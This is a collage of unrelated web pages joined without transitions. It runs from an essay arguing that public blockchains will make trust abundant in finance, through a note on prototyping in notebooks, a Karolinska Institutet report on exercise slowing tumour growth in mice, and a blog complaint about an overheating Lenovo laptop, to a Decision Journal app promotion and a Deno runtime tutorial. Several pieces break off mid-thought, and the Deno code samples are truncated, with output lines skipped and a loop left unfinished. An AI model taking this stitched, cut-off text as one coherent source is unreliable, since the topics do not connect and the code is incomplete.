<!--kg-card-end: markdown--><p>If there's something you're used to doing on the phone, that will go to software. If there's something you're used to doing with paper, that will go to software. If there's something that you're used to doing in person and there is any way it can go to software, it will go to software.</p><p>Countless physical products are <a href="https://www.makeuseof.com/tag/apps-replacing-modern-devices/">now just apps on the phone</a> for most people: cameras, maps, keys, paper tickets, books, newspapers, magazines, calendars, radios, televisions, measuring tapes, remote controls, mirrors, and flash lights. Just to name a few. And more are being added all the time.</p><p>In other words, if it can become bits, it becomes bits.</p><p>What are <a href="https://en.wikipedia.org/wiki/Bit">bits</a>? Zeroes and ones―a basic unit of information in computing. Data expressed as a series of zeroes and ones is what we call <a href="https://www.google.com/search?q=digital">digital</a>.</p><p>And digital is different. On a deep and fundamental level.</p><p>An obvious reason is that digital products are easier to change, so it's faster to innovate and add new capabilities or features. Digital products are also easier to replicate at scale and are much more cost effective.</p><p>A less obvious reason is that digital products enable a shift from a world based on scarcity into a world based on abundance, unlocking large opportunities for value creation and re-arranging existing value chains in the process.</p><p><a href="https://www.usv.com/people/albert-wenger/">Albert Wenger</a>, a partner at Union Square Ventures, <a href="https://worldaftercapital.gitbook.io/worldaftercapital/digital">describes the two most important ways digital is different</a>:</p><ul><li><strong><strong>Zero marginal costs</strong></strong> Making one additional unit and delivering it across the network costs nothing. The price for a product with zero marginal cost trends towards free. Zero marginal cost is like an economic singularity similar to dividing by zero in math―as you approach it strange things begin to happen, ranging from digital near-monopolies to granting all of humanity access to the world's knowledge.</li><li><strong><strong>Universality of computation</strong></strong> Anything that can be computed in the universe, can be computed by the type of machines we already have today, given enough memory and time. Computation means taking information inputs, executing a series of processing steps, and producing information outputs. Which is essentially what a human brain does. In principle, a digital machine can do everything a human brain does.</li></ul><p>So if products and services in your field are becoming software products and can take advantage of zero marginal costs and universality of computation, how do you figure out what might happen to your market?</p><!--kg-card-begin: markdown--><p>Ask yourself some of the <a href="https://andyjagoe.com/investment-analysis/">questions an early stage investor asks</a>  before investing in a startup:</p>
<ul>
<li>What used to be scarce but is now abundant?</li>
<li>What used to be full of friction but is now no friction? And how will consumer behavior change?</li>
<li>What is the new scarcity that the startup is going to claim?</li>
<li>How is the value chain arranged today and how can it be re-arranged to eliminate existing players or reduce their margins so that the total friction to a customer is lower but that the new point of friction is the startup—and that is why the startup can collect money?</li>
</ul>
<!--kg-card-end: markdown--><p>For example, before the Web, information was scarce. Getting answers to questions was full of friction. It required knowing who to ask, or which physical books, magazines or articles to pore over. And then, how did you actually know if you had really found the best answer? Or just a local maxima?</p><p>With the emergence of &nbsp;the Web, information was digitized and only a click away. Information was now abundant. But there was a new problem. How did you find it?</p><p>Finding the best answers to questions was the new scarcity, and Google built clever software that did a much better job of ranking answers to questions than anyone else. Because of zero marginal costs, they allowed people to use it for free. The experience was 10x better than any alternative, and made users feel awesome. Like they had a superpower. </p><p>This was the beginning of a virtuous cycle. As people clicked on answers, Google recorded clicks as votes and then recalibrated their rankings. The more people used Google, the better it got. And the better it got, the more people used Google.</p><p>Software and digitalization enabled Google to aggregate the world's demand for answers on a scale never before seen. Google was the new point of friction in the value chain, and anyone who wanted to show up as the top answer had to pay. Many selling information (the old scarcity) had to find a new business.</p><p>OK, so what does all this mean for financial services?</p><p>Most money today is just information in a database. Deposits (checking and savings) should already be zero marginal cost, but banks have added friction and bureaucracy to keep money safe because of fraud and the absence of trust. Customers have been okay with this because trust is fundamentally what they've been buying.</p><p>As an individual, how can I trust that my money will be there when I need it? How can I trust that when I send a payment it's received by who I intended? How can I trust that I can borrow money when I need to? And that my loans will not be called in early? How can I trust that I own what I believe I have invested in? And when I have an accident, how can I trust my policy will pay as expected?</p><p>In today's world, trust is scarce.</p><p>But what if the world changed, and this was no longer true? What would happen to today's leading financial companies and their business models if trust became abundant?</p><p>Let's take a look at the evolution of the financial services platform stack¹ and see how things are changing.</p><h3 id="pre-internet-era">Pre-Internet Era</h3><p>For hundreds of years prior to the Internet, financial services were a vertically integrated oligopoly controlled by large banks. Names varied by country, but the story was always the same. Big banks managed every aspect of the stack, from the end user experience (bankers and ATMs) all the way down to the lowest level of infrastructure (settlements). </p><p>Regulation, infrastructure and customer acquisition cost made entry difficult, and so existing firms were very profitable. New products were rare, and old products hardly changed (aside from rates, fees or terms of service). Software was important at the platform and infrastructure layers, but would not be considered <a href="https://en.wikipedia.org/wiki/Software_design">good software</a> by today's standards. Software was used mainly to do old things better. There was no incentive to innovate, so things stayed the same.</p><figure><img src="https://andyjagoe.com/content/images/2020/10/Evolution-of-Finance--1-.png" alt="" srcset="https://andyjagoe.com/content/images/size/w600/2020/10/Evolution-of-Finance--1-.png 600w, https://andyjagoe.com/content/images/2020/10/Evolution-of-Finance--1-.png 960w" sizes="(min-width: 720px) 720px"><figcaption>Evolution of Finance: Pre-Internet Era</figcaption></figure><h3 id="internet-era">Internet Era</h3><p>Mobile phones and broadband access to the Web meant that customers wanted always-on self-service access to financial services. Banks launched web sites and mobile apps, but there was no change to the underlying products and services being offered. Just a new way to interact with them that saved banks money. Once again, new technology was used to do old things better.</p><p>Meanwhile, a new class of innovators called fintechs emerged that were good at software, user experience and interfaces. They started targeting underserved customer segments and making improvements in the experience and interface layer, while partnering with existing financial services players for the middle office, back office and settlements.</p><p>These fintechs and neobanks are software companies in a way that banks are not. And some have become very big, like PayPal, Stripe, Square and Robinhood. Despite this, they are mainly innovating around the edge. Money and value still settles through fintechs essentially the same way paper bills settled hundreds of years ago.</p><figure><img src="https://andyjagoe.com/content/images/2020/10/Evolution-of-Finance--5-.png" alt="" srcset="https://andyjagoe.com/content/images/size/w600/2020/10/Evolution-of-Finance--5-.png 600w, https://andyjagoe.com/content/images/2020/10/Evolution-of-Finance--5-.png 960w" sizes="(min-width: 720px) 720px"><figcaption>Evolution of Finance: Internet Era</figcaption></figure><h3 id="future-era">Future Era</h3><p>Large financial institutions from the Pre-Internet era are still in control of the financial system today. The top four US banks each hold over a <a href="https://www.usbanklocations.com/bank-rank/total-deposits.html">trillion dollars in deposits</a> and maintain their positions through bundling, regulation and scarcity of access to the financial system's platform and infrastructure layers―coupled with a good measure of inertia, fear, uncertainty, and doubt. </p><p>Their value proposition is trust. </p><p>But <strong>public blockchains make trust abundant</strong>. And when trust is no longer scarce, big changes will happen in financial services.</p><p>It's hard to overstate how important this is. Today's entire financial system is based on trust being scarce. And unlike fintechs innovating around the edge, trust becoming abundant will enable fundamental and deep re-ordering of the financial services value chain.</p><p>Like many new technologies, today public blockchains and crypto-assets seem <a href="https://cdixon.org/2010/01/03/the-next-big-thing-will-start-out-looking-like-a-toy">like toys</a>. <a href="https://cdixon.org/2019/01/08/strong-and-weak-technologies">Strange, unserious, and expensive</a>. Maybe even dangerous. But over time, new technologies like these get better and are adopted gradually, and then suddenly. And often massively expand a market, making it <a href="https://andyjagoe.com/why-the-market-for-bitcoin-may-be-bigger-than-you-think/">orders of magnitude bigger.</a></p><figure><img src="https://andyjagoe.com/content/images/2020/10/Evolution-of-Finance--6-.png" alt="" srcset="https://andyjagoe.com/content/images/size/w600/2020/10/Evolution-of-Finance--6-.png 600w, https://andyjagoe.com/content/images/2020/10/Evolution-of-Finance--6-.png 960w" sizes="(min-width: 720px) 720px"><figcaption>Evolution of Finance: Future Era</figcaption></figure><p>This is how software eats money. <a href="https://andyjagoe.com/why-the-market-for-bitcoin-may-be-bigger-than-you-think/">Multi-sided networks like Bitcoin</a> will emerge and provide parallel platform and infrastructure layers that make trust abundant and can be freely innovated on.

<div><h2 id="The-Virtues-of-Prototyping">The Virtues of Prototyping<a href="#The-Virtues-of-Prototyping">¶</a></h2><p>One neat thing about prototyping (with Python or whatever) is that it allows you to fully focus on your <em>approach</em>, rather than on the infrastructure. Very obviously, this is useful for <em>teaching</em> – you can use examples as the ones above in a lecture to very quickly communicate essential techniques of program analysis and test generation.</p>
<p>But prototyping has more advantages. A Jupyter Notebook (like this one) documents how you developed your approach, together with examples, experiments, and rationales – and still focusing on the essentials. If you write a tool the "classical" way, you will eventually deliver thousands of lines of code that do everything under the sun, but only once you have implemented everything will you know whether things actually work. This is a huge risk, and if you still have to change things, you will have to refactor things again and again. Furthermore, for anyone who will work on that code later, it will take days, if not weeks, to re-extract the basic idea of the approach, as it will be buried under loads and loads of infrastructure and refactorings.</p>
<p>Our consequence at this point is that we now implement new ideas <em>twice</em>:</p>
<ul>
<li><p>First, we implement things as a notebook (as this one), experimenting with various approaches and parameters until we get them right.</p>
</li>
<li><p>Only once we have the approach right, and if we have confidence that it works, we reimplement it in a tool that works on large scale programs. This can still take weeks to months, but at least we know we are on a good path.</p>
</li>
</ul>
<p>Incidentally, it may well be that the original notebooks will have a longer life, as they are simpler, better documented, and capture the gist of our novel idea. And this is how several of the notebooks in this book came to be.</p>

            <p>Prior research has shown that physical activity can prevent unhealth as well as improve the prognosis of several diseases including various forms of cancer. Exactly how exercise exerts its protective effects against cancer is, however, still unknown, especially when it comes to the biological mechanisms. One plausible explanation is that physical activity activates the immune system and thereby bolsters the body’s ability to prevent and inhibit cancer growth.</p>

<p>In this study, researchers at Karolinska Institutet expanded on this hypothesis by examining how the immune system’s cytotoxic T cells, that is white blood cells specialized in killing cancer cells, respond to exercise.</p>

<h2>Cancer growth slowed in trained animals</h2>

<p>They divided mice with cancer into two groups and let one group exercise regularly in a spinning wheel while the other remained inactive. The result showed that cancer growth slowed and mortality decreased in the trained animals compared with the untrained.</p>

<p>Next, the researchers examined the importance of cytotoxic T cells by injecting antibodies that remove these T cells in both trained and untrained mice. The antibodies knocked out the positive effect of exercise on both cancer growth and survival, which according to the researchers demonstrates the significance of these T cells for exercise-induced suppression of cancer.</p>

<p>The researchers also transferred cytotoxic T cells from trained to untrained mice with tumors, which improved their prospects compared with those who got cells from untrained animals.</p>

<h2>Exercise altered T cell metabolism</h2>

<p>To examine how exercise influenced cancer growth, the researchers isolated T cells, blood and tissue samples after a training sessions and measured levels of common metabolites that are produced in muscle and excreted into plasma at high levels during exertion. Some of these metabolites, such as lactate, altered the metabolism of the T cells and increased their activity. The researchers also found that T cells isolated from an exercised animal showed an altered metabolism compared to T cells from resting animals.</p>

<p>In addition, the researchers examined how these metabolites change in response to exercise in humans. They took blood samples from eight healthy men after 30 minutes of intense cycling and noticed that the same training-induced metabolites were released in humans.</p>

<p>“Our research shows that exercise affects the production of several molecules and metabolites that activate cancer-fighting immune cells and thereby inhibit cancer growth,” says <a href="https://staff.ki.se/people/helame">Helene Rundqvist</a>, senior researcher at the <a href="https://ki.se/en/labmed/department-of-laboratory-medicine">Department of Laboratory Medicine</a>, Karolinska Institutet, and the study’s first author. “We hope these results may contribute to a deeper understanding of how our lifestyle impacts our immune system and inform the development of new immunotherapies against cancer.”</p>

<p>The researchers have received financing from the Knut and Alice Wallenberg Foundation, the Swedish Research Council, the Swedish Cancer Society, the Swedish Childhood Cancer Foundation, the Swedish Society of Medicine, Cancer Research UK and the Wellcome Trust.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>If you are into process management, you don’t see services. You see the processes behind them. And even though I was just an ordinary customer, I could see that Lenovo has some key processes that are seriously broken.</p><div>
			<p><i>Disclaimer: This text isn’t a lament from an angry customer, but rather a reflection of one customer’s experience which was determined by process flaws. The complaint itself went well and I have nothing to moan about there.</i></p>
<p>My old laptop died, so I went and bought a new <a href="https://www.lenovo.com/gb/en/laptops/thinkpad/l-series/ThinkPad-L580/p/22TP2TBL580">Lenovo ThinkPad L580</a>. The thin chassis made of black plastic combined with a powerful i7 processor wasn’t the right choice though:</p>
<p>Hot air was blowing from the right vent of the fan directly onto my right hand holding a mouse. And when I placed my hands onto the keyboard, the i7 processor located just under my right wrist was overheating under the load to the point where I felt like I was typing on a heater.</p>
<p>So it made me wonder:</p>
<ul>
<li>How could Lenovo put a laptop with such bad heat management on the market?</li>
<li>Don’t they have some <b>“not-to-do” </b>list of previous construction mistakes to avoid?</li>
<li>Does Lenovo have an autonomous <a href="https://procesoid.com/blog/process/">process</a> for testing prototypes to correct ill-conceived product designs?</li>
<li>And if it does, why is the vent for the fan on the right side, where most people hold their mouse, and why is the processor exactly where it would be felt by the user?</li>
<li>And if my particular laptop was overheating that much, how could it leave the factory in the first place? A well designed stress test would reveal such overheating easily.</li>
</ul>
<p>These problems aren’t expensive to detect and fix, nor does it take exceptional intelligence to do so. It only takes properly implemented and reliable <a href="https://procesoid.com/blog/business-process/">business processes</a>. And it’s not a trifle. The brand’s reputation is at stake.</p>
<p>Even more curious to me is that according to a heatmap published in the <a href="https://www.notebookcheck.net/Lenovo-ThinkPad-T580-i7-8550U-MX150-UHD-Laptop-Review.299796.0.html">review</a> by the renowned webzine <i>NotebookCheck</i> the heat problem extends also to the higher model T580. Although that one has the vent of the fan on the left side, the keyboard area can get as hot as a tropical 43,5°C (107 F):</p>
		<p><a href="https://www.notebookcheck.net/Lenovo-ThinkPad-T580-i7-8550U-MX150-UHD-Laptop-Review.299796.0.html"><img loading="lazy" src="https://procesoid.com/wp-content/uploads/2018/08/Stress_oben.jpg" alt="Lenovo T580 stress test heatmap" width="640" height="480" srcset="https://procesoid.com/wp-content/uploads/2018/08/Stress_oben.jpg 640w, https://procesoid.com/wp-content/uploads/2018/08/Stress_oben-300x225.jpg 300w, https://procesoid.com/wp-content/uploads/2018/08/Stress_oben-96x73.jpg 96w, https://procesoid.com/wp-content/uploads/2018/08/Stress_oben-76x58.jpg 76w" sizes="(max-width: 640px) 100vw, 640px"></a> Source: NotebookCheck.net		</p>
	
<p>Right after diagnosing the problem, I contacted the seller, who recommended me to file a fast <a href="https://www.computerhope.com/jargon/d/doa.htm">DOA</a> complaint through a national Lenovo partner. There I was first promised a fast resolution by some lady over the phone. But later, her less agreeable colleague told me after the arrival and diagnosing of my laptop that the heat<b> is a feature and not a flaw.</b> —&nbsp;<i>Excuse me? So I’ve bought a heater instead of a laptop?!</i></p>
<p>Thus, I pointed out to the gentleman that this is not what the customer <b>support </b>for business laptops should look like and that his duty is to <b>help </b>the customers. I have also stressed that if my complaint was denied, it would leave me no other option than to send a complaint directly to Lenovo. He called me back in a few minutes and suddenly <b>nothing was a problem. </b>He did a complete 180°, even suggested another round of testing and within two weeks my complaint was resolved to my satisfaction by a full refund.</p>
<p>Yet it made me wonder again:</p>
<ul>
<li>Why wasn’t there someone from the very beginning to express Lenovo’s commitment to resolve my obvious problem with a new $1,800 laptop?</li>
<li>How is it possible, that the “support” could initially promise a quick resolution and then have another staff member claim it is a feature? Don’t they have a CRM to be at least consistent in their communication?</li>
<li>Why is the ticketing support system unavailable most of the day and showing errors? And why was the ticket full of incomprehensible technical jargon?</li>
<li>Why does Lenovo outsource its customer care into the hands of such an incompetent local partner? Don’t they have a reliable process to choose and control the quality of their local support?</li>
<li>Why, after I have filled out a form sent from <i>Lenovo EMEA Customer Experience</i> and complained about my problems with the local support, wasn’t there someone to contact me <b>immediately </b>to restore my confidence in the company’s reputation?</li>
<li>Why hasn’t anyone apologized to me during all this for the problem with a new product and troubles it has caused me? Not to mention offered me some compensation for the time lost.</li>
</ul>
<p>Customer care isn’t difficult with competent staff and a strong process structure. But if one chooses to outsource it (and the brand’s reputation with it) into someone’s hands, it is <b>absolutely crucial</b> to guard the customer experience by something more than a stupid form send in an email full of grammatical mistakes, to which there is no follow-up reply anyway. It tells another story about the company and its culture.</p>
<p>Would I buy another laptop by Lenovo after this experience? Only under the condition that the whole company was running like a Swiss watch. At the moment it looks rather like a game of Chinese roulette.</p>

        <h2>Make better decisions.</h2>
      </p>
      <p>A decision journal is a simple, yet effective tool. It helps us to avoid hindsight bias, recognize patterns of mistakes in our decision making, and provide accurate and honest feedback on the decisions we make.</p>

<p>For those unfamiliar with what a decision journal is, it is the simple idea of keeping track of your decisions by writing them down for the purpose of reviewing it in the future. The Nobel Prize winner and famous psychologist <a href="https://fs.blog/2014/02/decision-journal/" target="_blank">Daniel Kahneman introduced the basic concept of a decision journal</a>:</p>

<blockquote>
  <p>“Go down to a local drugstore and buy a very cheap notebook and start keeping track of your decisions. And the specific idea is whenever you’re making a consequential decision, something going in or out of the portfolio, just take a moment to think, write down what you expect to happen, why you expect it to happen and then actually, and this is optional, but probably a great idea, is write down how you feel about the situation, both physically and even emotionally. Just, how do you feel? I feel tired. I feel good, or this stock is really draining me. Whatever you think.”</p>
</blockquote>

<p>This, Kahneman said, helps us avoid hindisight bias. The bias where everyone tends to look back on their own past in a favorable light. It’s the tendency people have of attributing their success to their own skills and talent but their failures to bad luck.</p>

<p>By keeping a decision journal, we avoid this bias by writing down exactly how we feel in the moment of making the decision. That way our future self can’t create a false narrative. We’re forced to be honest with ourselves.</p>

<p>Many decision makers in all walks of life use decision journals to help them improve their decision making capabilities. The problem is they can be challenging to maintain and keep track of. They require you to always remember to write down the decisions you want to keep track of and to go back and review them periodically. This causes many people to stop using them or to use them sub-optimally.</p>

<p>What if there was a more convenient way to use a decision journal?</p>

<p>Now there is, introducing Decision Journal, now available on <a href="https://apps.apple.com/us/app/decision-journal/id1534768141" target="_blank">iOS</a> and <a href="https://play.google.com/store/apps/details?id=com.betterthinkingsoftware.decisionjournal" target="_blank">Android</a>.</p>

<p>With Decision Journal, we tried to take all of the awesome benefits decision journals offer and augment them with modern technology and software. Let’s go over some of the app’s key features.</p>

<h4 id="always-with-you">Always with you</h4>

<p>One of the challenges in keeping a good decision journal is making sure that you remember to write down the important decisions you want to keep track of. Not only that but the whole point of a decision journal is so that you can later recall exactly what you were thinking and feeling at the time of the decision. The challenge is that we don’t remember everything and the longer you go without writing down your thoughts, the more likely what you write down will be inaccurate.</p>

<p>That’s one of the great benefits of using the Decision Journal app as your decision journal. It’s always with you. Whenever you make a decision or begin thinking about making a particular decision, you can pull your phone out of your pocket and jot it down. Plus, given that it is on your phone, we’ll sync it to the cloud every time you save it so that you can keep track of your decisions on your own time, whenever is most convenient for you.</p>

<p><img src="https://decisionjournalapp.com/assets/img/screens/welcome-image.light.ios.png" height="350">
</p>

<h4 id="scheduled-reviews">Scheduled reviews</h4>

<p>Another important part of keeping a decision journal is so that you can accurately and honestly evaluate your decisions. However, one of the challenges is in remembering to do so in a timely manner.</p>

<p>We’re probably all too familiar with setting out our New Year’s resolutions at the beginning of each year, only to never follow up and review them. Why? Because life happens and we lose track of things. We’re human.</p>

<p>But that’s where technology can come in and assist us. With the Decision Journal app, we’ve made it super simple to mark a particular decision for a review at some point in the future. And you don’t have to remember to follow up, the app will do all of that for you. When it’s time to review a particular decision, the app will send you a notification letting you know that a particular decision is up for review.</p>

<p>And we didn’t just stop there. Sometimes you make decisions where the outcome of that decision can take place over long periods of time. That’s why we made it easy for you to schedule multiple reviews for any decision.</p>

<p><img src="https://decisionjournalapp.com/assets/img/screens/schedule-review.light.ios.png" height="350">
</p>

<h4 id="analyze-the-results">Analyze the results</h4>

<p>The whole point in keeping a decision journal in the first place is to try and improve on our decision making ability. That means picking up on patterns of errors and mistakes that we may be making.</p>

<p>With a paper and pen journal, this can be quite challenging. We may be able to remember the most frequent patterns of errors that we make but we might also miss a lot due to information overload.</p>

<p>This is another area where modern technology and software can help us. With the Decision Journal app, you can tag every decision you make to easily find trends and patterns in any particular category of decisions. In addition to tags, we’ve also added a powerful search capability that allows you to find decisions in a flash, so that you can be sure you’re not missing anything.</p>

<p><img src="https://decisionjournalapp.com/assets/img/screens/analyze-results.light.ios.png" height="350">
</p>

<h4 id="make-better-decisions-today">Make better decisions today</h4>

<p>Decision journals are such a powerful and effective tool for helping you make better decisions. Everyone should be using them. The problem is, they can also be a challenge and a burden to keep. That’s why we created the Decision Journal app for <a href="https://apps.apple.com/us/app/decision-journal/id1534768141" target="_blank">iOS</a> and <a href="https://play.google.com/store/apps/details?id=com.betterthinkingsoftware.decisionjournal" target="_blank">Android</a>.</p>

<p>It takes the powerful concept of a decision journal and expands on it with new capabilities made possible through modern technology and software. We think it is an essential tool for any decision maker out there, but don’t just take our word for it, give it a try today:</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>During the last 10 years, Node.js has become a big player in the backend framework market, powering several large scale applications across the globe. Meanwhile, JavaScript has also evolved greatly, not only because of the efforts of its development team, but also based on community feedback. However, integrating some of these new language features into a 10-year-old framework is not really straightforward, and has a high level of complexity.</p>
<p>Therefore we could say that Node.js’ architecture hasn’t evolved as fast as the language. As a basic example, Node.js is still based on callbacks, while there are far better ways to deal with asynchronicity in modern JavaScript. This is something that its creator, Ryan Dahl, has acknowledged in the past few years, and it has moved him to work on a new framework that addresses some of these issues. It is called Deno, and in the following article, we would like to explore some of its concepts to determine if it will render Node.js obsolete.</p>
<h2 id="what-is-deno">What is Deno?</h2>
<p>First of all, you should know that Deno is not a fork of Node.js. It’s a modern runtime for JavaScript and TypeScript, implemented from scratch by Ryan Dahl in 2018. It was built on <a href="https://v8.dev/">V8</a> just like Node.js, but Deno was written with <a href="https://www.rust-lang.org/">Rust</a> and <a href="https://tokio.rs/">Tokio</a>. The runtime was designed with TypeScript in mind, and for that reason Deno supports TypeScript without extra configurations or tooling.</p>
<p>Deno was built to improve security and help increase productivity in developers using the latest JavaScript features. At the time this article was written, Deno’s version is 1.4.0. It’s a stable release, so it’s a good time to go over its main features and learn how you can use them for your application.</p>
<h2 id="features">Features</h2>
<h3 id="typescript-out-of-the-box">TypeScript out of the box:</h3>
<p>TypeScript is powerful. This superset of JavaScript allows us to use types, interfaces, classes, inheritance, modules, generics, and other awesome things. However, it can be a bit tricky when using it with Node.js, because we need to install a module for TypeScript support and some tools to transpile the code. It also requires some additional configurations through tsconfig.json. However, after all of this setup, the JavaScript files that get compiled from TypeScript work pretty well with Node.js.</p>
<p>Deno offers native support for TypeScript at its 3.9 version. For it to run nothing else needs to be installed, and no compilation step is needed since Deno transpiles the code behind the scenes. It is also possible to run the code with a custom <code>tsconfig.json</code> file to customize how Deno compiles your code.</p>
<div id="cb1"><pre><code><span id="cb1-1"><a href="#cb1-1"></a><span># Using a custom tsconfig.json file</span></span>
<span id="cb1-2"><a href="#cb1-2"></a><span>deno</span> run -c tsconfig.json my-application.ts</span></code></pre></div>
<h3 id="url-imports">URL imports:</h3>
<p>Node.js projects have a <code>package.json</code> file that contains relevant information for your project. It also holds the dependency list that you’ll be using. Deno handles this part in a completely different way. The <code>package.json</code> file is not used anymore in favor of <code>ES Modules</code>. In order to use modules in a Deno project, you will need to reference each module with its URL or file path.</p>
<div id="cb2"><pre><code><span id="cb2-1"><a href="#cb2-1"></a># Import <span>module</span> <span>server</span></span>
<span id="cb2-2"><a href="#cb2-2"></a><span>import</span> <span>{</span>serve<span>}</span> <span>from</span> “https<span>:</span><span>//deno.land/std/http/server.ts”</span></span></code></pre></div>
<p>When the application is executed for the first time, Deno downloads and caches all modules in a global cache. It is possible to store them in a custom directory using the <code>$DENO_DIR</code> environment variable. With this approach, Deno decentralizes the modules and your project will not have a large <code>node_modules</code> folder.</p>
<p>To keep module versions locked, it is possible to create a lock file with the <code>--lock</code> and <code>--lock-write</code> flags.</p>
<div id="cb3"><pre><code><span id="cb3-1"><a href="#cb3-1"></a><span># Create/update the lock file "lock.json"</span></span>
<span id="cb3-2"><a href="#cb3-2"></a><span>deno</span> cache --lock=lock.json --lock-write src/my-application.ts</span></code></pre></div>
<h3 id="secure-by-default">Secure by Default:</h3>
<p>Deno has some security measures in place to disallow potentially dangerous operations. By default, the code is executed in a secure sandbox, so it is not possible to access the network, file system, or environment unless you explicitly allow it. You can do this by adding flags when running the application. These are enabled by default in Node.js, which makes it insecure in some cases.</p>
<p>As a quick overview of what can be enabled we have the following flags:</p>
<div id="cb4"><pre><code><span id="cb4-1"><a href="#cb4-1"></a><span># Enable environment access with Deno.env.get</span></span>
<span id="cb4-2"><a href="#cb4-2"></a><span>deno</span> run --allow-env my-application.ts</span>
<span id="cb4-3"><a href="#cb4-3"></a></span>
<span id="cb4-4"><a href="#cb4-4"></a><span>#Enable high resolution time measurement (used for profiling)</span></span>
<span id="cb4-5"><a href="#cb4-5"></a><span>deno</span> run --allow-hrtime my-application.ts</span>
<span id="cb4-6"><a href="#cb4-6"></a></span>
<span id="cb4-7"><a href="#cb4-7"></a><span>#Enable network access</span></span>
<span id="cb4-8"><a href="#cb4-8"></a><span># This is used in cases where we want to fetch from external servers</span></span>
<span id="cb4-9"><a href="#cb4-9"></a><span># or when we want to expose a port from our server</span></span>
<span id="cb4-10"><a href="#cb4-10"></a><span>deno</span> run --allow-net=https://example.com my-application.ts</span>
<span id="cb4-11"><a href="#cb4-11"></a></span>
<span id="cb4-12"><a href="#cb4-12"></a><span># Enable plugin usage</span></span>
<span id="cb4-13"><a href="#cb4-13"></a><span>deno</span> run --allow-plugin my-application.ts</span>
<span id="cb4-14"><a href="#cb4-14"></a></span>
<span id="cb4-15"><a href="#cb4-15"></a><span># Enable filesystem access</span></span>
<span id="cb4-16"><a href="#cb4-16"></a><span># To read a file or directory with Deno.open, or write to a file</span></span>
<span id="cb4-17"><a href="#cb4-17"></a><span># or  directory with Deno.writeFile</span></span>
<span id="cb4-18"><a href="#cb4-18"></a><span>deno</span> run --allow-read=awesome.txt my-application.ts</span>
<span id="cb4-19"><a href="#cb4-19"></a><span>deno</span> run --allow-write=awesome.txt my-application.ts</span>
<span id="cb4-20"><a href="#cb4-20"></a></span>
<span id="cb4-21"><a href="#cb4-21"></a><span># Enable subprocess execution with Deno.run</span></span>
<span id="cb4-22"><a href="#cb4-22"></a><span>deno</span> run --allow-run my-application.ts</span>
<span id="cb4-23"><a href="#cb4-23"></a></span>
<span id="cb4-24"><a href="#cb4-24"></a><span># Disable all security checks</span></span>
<span id="cb4-25"><a href="#cb4-25"></a><span>deno</span> run --allow-all my-application.ts</span></code></pre></div>
<h3 id="built-in-utilities">Built-in utilities:</h3>
<p>In Deno, we have some nice tools available out of the box. This means that we don’t need to install any additional libraries for some common development tasks. At a glance, these utilities are:</p>
<p><strong>Debugger:</strong> Like Node, Deno supports the V8 Inspector Protocol, which means that it’s possible to debug the program in any client that supports it. This consists mainly of two commands:</p>
<div id="cb5"><pre><code><span id="cb5-1"><a href="#cb5-1"></a><span># Debugging flags</span></span>
<span id="cb5-2"><a href="#cb5-2"></a><span>#   --inspect      : Allows debugger attachment at any point</span></span>
<span id="cb5-3"><a href="#cb5-3"></a><span>#   --inspect-brk  : Pause execution on first line</span></span>
<span id="cb5-4"><a href="#cb5-4"></a><span># Usage:</span></span>
<span id="cb5-5"><a href="#cb5-5"></a><span>deno</span> run --inspect-brk</span></code></pre></div>
<p>From this point, all you have to do is open your client and the program will stop on the first line, allowing you to set up breakpoints where you need to. For VSCode you can add the entry point and arguments to your <code>launch.json</code> to enable it.</p>
<p><strong>Formatter:</strong> In Node.js applications, it’s common to add a linter tool (typically ESLint) with a formatter like Prettier so the code is standardized. Deno has this feature built into it. You can access it by simply running <code>deno fmt</code></p>
<div id="cb6"><pre><code><span id="cb6-1"><a href="#cb6-1"></a><span>deno</span> fmt          <span>#Formats everything in the current tree</span></span>
<span id="cb6-2"><a href="#cb6-2"></a><span>deno</span> fmt file1.ts <span>#Formats a single file</span></span>
<span id="cb6-3"><a href="#cb6-3"></a><span>deno</span> fmt --check  <span># Checks if files are formatted correctly</span></span></code></pre></div>
<p><strong>Bundler:</strong> Bundling is a task that is currently done with webpack, gulp or Grunt in Node.js applications. We can use Deno’s bundler when we want to pack a module together with its dependencies and this will generate a single module we can reference from other files. These bundles can also be loaded in the web browser.</p>
<div id="cb7"><pre><code><span id="cb7-1"><a href="#cb7-1"></a><span>deno</span> bundle https://foo.bar/test.ts test.bundle.js</span></code></pre></div>
<p>After that, we can import it from another JavaScript file or using a <code>&lt;script&gt;</code> tag in our HTML with the <code>type=”module”</code> property.</p>
<p><strong>Dependency inspector:</strong> We can display a tree structure of our dependencies using the <code>deno info</code> command, followed by the URL we want to inspect. This is similar to <code>npm ls</code> in Node</p>
<div id="cb8"><pre><code><span id="cb8-1"><a href="#cb8-1"></a><span>deno</span> info https://deno.land/std/uuid/test.ts</span>
<span id="cb8-2"><a href="#cb8-2"></a><span>local</span>: /Users/foo/Library/Caches/deno/deps/https/deno.land/997789467b3621b5d93c6b18bf8b275f35057b24f934c2508e3d1ef52cd51644</span>

<span id="cb8-16"><a href="#cb8-16"></a>  <span>.</span></span></code></pre></div>
<h3 id="asynchronous-handling">Asynchronous handling:</h3>
<p>JavaScript asynchronous operations have evolved over time. The standard way of making an asynchronous call was through the use of callbacks. Recently we’ve gotten better ways to handle these operations, by using Promises, async/await syntax or generators. For that reason, Deno has taken advantage of these modern features.</p>
<p>All async actions in Deno return a promise. This is interesting because the <code>await</code> keyword is supported on the top level and there is no need to define the function with the <code>async</code> keyword. This approach allows us to write more readable code when working with asynchronism.</p>
<div id="cb9"><pre><code><span id="cb9-1"><a href="#cb9-1"></a><span>// Await some asynchronous operation</span></span>
<span id="cb9-2"><a href="#cb9-2"></a><span>let</span> file <span>=</span> <span>await</span> <span>Deno</span><span>.</span><span>open</span>(<span>'./my-file.txt'</span>)<span>;</span></span>
<span id="cb9-3"><a href="#cb9-3"></a></span>
<span id="cb9-4"><a href="#cb9-4"></a><span>// Awaiting when starting the server</span></span>
<span id="cb9-5"><a href="#cb9-5"></a><span>import</span> <span>{</span> serve <span>}</span> <span>from</span> <span>'https://deno.land/std/http/server.ts'</span><span>;</span></span>
<span id="cb9-6"><a href="#cb9-6"></a></span>
<span id="cb9-7"><a href="#cb9-7"></a><span>const</span> server <span>=</span> <span>serve</span>(<span>{</span> port<span>:</span> <span>3000</span> <span>}</span>)<span>;</span></span>
<span id="cb9-8"><a href="#cb9-8"></a></span>
<span id="cb9-9"><a href="#cb9-9"></a><span>for</span> <span>await</span> (<span>const</span> req <span>of</span> server)<span>{</span></span>
